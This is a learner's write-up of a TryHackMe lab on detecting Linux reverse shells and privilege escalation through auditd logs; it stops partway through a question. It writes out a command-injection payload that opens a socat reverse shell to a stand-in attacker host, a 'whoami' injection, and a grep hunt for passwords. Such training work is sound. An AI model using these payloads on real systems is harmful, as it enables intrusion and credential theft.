# Detecting Discovery Techniques in Linux Systems
**Date:** 2026-04-28

**Objective:**
- Learn how reverse shells are used in Linux intrusions
- Understand how the attackers escalate their privileges
- Explore the five most common techniques to persist on Linux

**Environment:** TryHackMe – “Linux Threat Detection 3” room  
**Tools Used:** CLI

---

## REVERSE SHELLS

> Run 127.0.0.1 && whoami in the TryPingMe web app.

> Access the scenario auditd logs at ausearch -i -if /home/ubuntu/scenario/audit.log
### What output do you see after the ping results?

<img width="1280" height="435" alt="Screenshot 2026-04-28 at 5 03 57 PM" src="https://github.com/user-attachments/assets/646abffd-ef97-4139-9b1e-85e5bd2df14a" />

<img width="1918" height="798" alt="image" src="https://github.com/user-attachments/assets/85a920e1-7e11-47df-bd4b-497d0486765a" />

- svctrypingme

##
> Now try spawning a reverse shell to the imaginary "attacker.thm" address.

> Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app.
### What is the flag returned in the TryPingMe response?

<img width="1916" height="1052" alt="image" src="https://github.com/user-attachments/assets/d9038d6b-ae1e-4fb1-a443-d46da67c1c88" />

To clarify, I did insert the command in the box and this is what I received. 
This goes over the process of how some attackers are ableI to exploit vulnerabilities as a client (client side). Working with metasploit (I should link my metasploit walkthrough here) will show you the process of listening for the response, connecting, and trying to further exploit many other vulnerabilities / extract information. 

- THM{revshells_practitioner!}

##
> Now look at the exported auditd logs at /home/ubuntu/scenario.
### Which IP spawned a similar reverse shell via the TryPingMe app?

Initially, I used "ausearch -i -if /home/ubuntu/scenario/audit.log" and scrolled through to find the answer, however, to hone it down better:
<img width="2214" height="424" alt="image" src="https://github.com/user-attachments/assets/895210e6-d33e-4b33-99b1-0215b89fec17" />

Initially, I beleive theres activity where the attacker is attempting to ping themselves to ensure that a connection can be made and then begins to run commands to establish a reverse shell

- 10.14.105.255

---

## PRIVILEGE ESCALATION

### Which command line was used to look for the "pass" keyword in files?

For this, I used "ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'pass'"

<img width="1680" height="280" alt="image" src="https://github.com/user-attachments/assets/88095872-55f7-470b-ab14-a1b4857db7c4" />

- grep -iR pass .

##

### Which command line was used to escalate privileges to root?

<img width="2202" height="230" alt="image" src="https://github.com/user-attachments/assets/bfc50302-f41d-45f3-a73b-37c5f7e1e065" />
- uid: svctrypingme -> This is who it was launched by (remember that when pinging the IP and using whoami, we received "svctrypingme")
- Command: sudo su (root)
- PPID / PID: 2546 / 2554

##

### Looking at the detected .env file, what was the root password?

One thing I've learned that THM failed to emphasize is running something similar to "ausearch -i -x <(directory of audit folder inclduing audit log name) | (command)", instead, they've ran "ausearch -i -x (command).

<img width="2222" height="1142" alt="image" src="https://github.com/user-attachments/assets/ff5f5894-6bbd-4ec1-90b0-d449e18f9c0f" />

<img width="884" height="306" alt="image" src="https://github.com/user-attachments/assets/19e34958-d693-4aee-a6c5-f6d4b2494d99" />


